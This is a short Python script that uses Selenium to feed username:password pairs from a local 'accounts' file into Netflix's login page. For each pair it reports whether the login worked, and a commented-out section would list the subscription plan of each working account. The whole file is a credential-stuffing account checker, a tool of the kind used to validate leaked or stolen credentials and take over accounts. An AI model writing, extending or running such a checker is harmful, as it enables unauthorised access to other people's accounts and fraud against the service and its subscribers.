from selenium import webdriver
import time
from bs4 import BeautifulSoup

driver = webdriver.Chrome()


def check(user, password):
    """check if the combination works"""
    driver.get("https://www.netflix.com/nl-en/login")
    user_elem = driver.find_element_by_name("userLoginId")
    password_elem = driver.find_element_by_name("password")
    button_elem = driver.find_element_by_class_name("login-button")

    user_elem.clear()
    password_elem.clear()

    user_elem.send_keys(user)
    password_elem.send_keys(password)
    button_elem.click()

    time.sleep(2)

    user_elem = driver.find_element_by_name("userLoginId")
    if user_elem.is_displayed():
        print("Incorrect")
    else:
        print("Correct")
    #  parse = BeautifulSoup(driver.page_source, 'html5lib')
    #  for h3 in parse.find_all('h3', {'class': "product-name"}):
        #  print('{}:{}:{}'.format(user, password, h3.get_text()))

    driver.delete_all_cookies()

with open('./accounts') as s:
    for line in s:
        users, passwords = line.split(':')
        check(users.strip(), passwords.strip())
    driver.delete_all_cookies()
    driver.close()
    driver.quit()
